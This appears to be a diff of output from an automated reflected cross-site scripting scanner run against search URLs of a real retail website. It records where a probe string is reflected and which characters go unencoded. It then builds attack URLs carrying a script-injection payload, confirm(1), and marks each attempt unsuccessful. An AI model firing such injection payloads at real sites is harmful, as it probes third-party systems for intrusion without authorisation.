@@ -1,6 +1,5 @@
-
+_______________________________________________________________________________________________________
 https://www.nearlynatural.com/collections/search-results?type="xyz'yxz</zxy&keywords=
-
 
 ----------------------------------------------------------------------------------
 Attribute Context: [1]
@@ -12,7 +11,7 @@ HTML Context: [0]
 
 ----------------------------------------------------------------------------------
 Script Context: [1]
-<script id="__st">var __st={"a":10894606436,"offset":-14400,"reqid":"0bf6bd37-a062-49bd-b216-abffbf39e3dc","pageurl":"www.nearlynatural.com\/collections\/search-results?type=%22xyz'yxz%3C\/zxy\u0026keywords=","u":"a1f95eb13335","p":"collection","rtyp":"collection","rid":121861111908};</script>
+<script id="__st">var __st={"a":10894606436,"offset":-14400,"reqid":"38e063d5-955a-4a11-9e4a-7b5bdeea7f6e","pageurl":"www.nearlynatural.com\/collections\/search-results?type=%22xyz'yxz%3C\/zxy\u0026keywords=","u":"2b7c81948fca","p":"collection","rtyp":"collection","rid":121861111908};</script>
 
 ----------------------------------------------------------------------------------
 URI Context: [2]
@@ -32,16 +31,31 @@ Same Script : [0]
 Same URI : [0]
 
 
-		 		ENCODING SUMMARY 
-	   	  Presence		"		'		<		/ 
+ENCODING   	  Presence		"		'		<		/ 
 ATTR:		True		True	True	True	False
+
+Attack Payloads for ATTR
+[]
+ENCODING   	  Presence		"		'		<		/ 
 HTML:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
 SCRIPT:		True		True	False	True	False
+
+Attack Payloads for SCRIPT
+["'; confirm(1); '"]
+
+SCRIPT Attack Url: https://www.nearlynatural.com/collections/search-results?type='; confirm(1); '&keywords=
+
+ ______ UnSuccessful with payload: '; confirm(1); '
+
+ENCODING   	  Presence		"		'		<		/ 
 URL:		True		True	True	True	False
 
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
 https://www.nearlynatural.com/collections/search-results?type=product&keywords="xyz'yxz</zxy
 
-
 ----------------------------------------------------------------------------------
 Attribute Context: [0]
 
@@ -49,8 +63,7 @@ Attribute Context: [0]
 HTML Context: [0]
 
 ----------------------------------------------------------------------------------
-Script Context: [1]
-<script id="__st">var __st={"a":10894606436,"offset":-14400,"reqid":"da801444-cd45-40f6-a41f-b4010217454b","pageurl":"www.nearlynatural.com\/collections\/search-results?type=product\u0026keywords=%22xyz'yxz%3C\/zxy","u":"cea7ba3b718b","p":"collection","rtyp":"collection","rid":121861111908};</script>
+Script Context: [0]
 
 ----------------------------------------------------------------------------------
 URI Context: [0]
@@ -68,16 +81,17 @@ Same Script : [0]
 Same URI : [0]
 
 
-		 		ENCODING SUMMARY 
-	   	  Presence		"		'		<		/ 
+ENCODING   	  Presence		"		'		<		/ 
 ATTR:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
 HTML:		False		False	False	False	False
-SCRIPT:		True		True	False	True	False
+ENCODING   	  Presence		"		'		<		/ 
+SCRIPT:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
 URL:		False		False	False	False	False
-
+_______________________________________________________________________________________________________
 https://www.nearlynatural.com/collections/search-results?keywords="xyz'yxz</zxy
 
-
 ----------------------------------------------------------------------------------
 Attribute Context: [0]
 
@@ -86,7 +100,7 @@ HTML Context: [0]
 
 ----------------------------------------------------------------------------------
 Script Context: [1]
-<script id="__st">var __st={"a":10894606436,"offset":-14400,"reqid":"82ee3e60-207a-4300-a704-b0e53c13732a","pageurl":"www.nearlynatural.com\/collections\/search-results?keywords=%22xyz'yxz%3C\/zxy","u":"4bee02f94f59","p":"collection","rtyp":"collection","rid":121861111908};</script>
+<script id="__st">var __st={"a":10894606436,"offset":-14400,"reqid":"129c64d7-2dd1-4b8a-a889-323865287dfa","pageurl":"www.nearlynatural.com\/collections\/search-results?keywords=%22xyz'yxz%3C\/zxy","u":"f6692b9345b2","p":"collection","rtyp":"collection","rid":121861111908};</script>
 
 ----------------------------------------------------------------------------------
 URI Context: [0]
@@ -104,9 +118,19 @@ Same Script : [0]
 Same URI : [0]
 
 
-		 		ENCODING SUMMARY 
-	   	  Presence		"		'		<		/ 
+ENCODING   	  Presence		"		'		<		/ 
 ATTR:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
 HTML:		False		False	False	False	False
+ENCODING   	  Presence		"		'		<		/ 
 SCRIPT:		True		True	False	True	False
+
+Attack Payloads for SCRIPT
+["'; confirm(1); '"]
+
+SCRIPT Attack Url: https://www.nearlynatural.com/collections/search-results?keywords='; confirm(1); '
+
+ ______ UnSuccessful with payload: '; confirm(1); '
+
+ENCODING   	  Presence		"		'		<		/ 
 URL:		False		False	False	False	False
